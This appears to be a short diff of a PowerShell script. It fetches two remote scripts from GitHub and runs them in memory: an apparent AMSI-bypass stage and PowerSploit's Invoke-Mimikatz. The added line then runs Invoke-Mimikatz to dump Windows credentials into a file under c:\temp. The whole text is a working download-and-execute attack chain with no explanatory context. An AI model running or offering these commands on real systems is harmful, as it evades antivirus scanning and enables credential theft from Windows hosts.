@@ -1,2 +1,3 @@
 iex (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/SecurityJon/AMSITempTesting/master/stage3.txt");
 iex (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1");
+Invoke-Mimikatz > c:\temp\ignore.txt
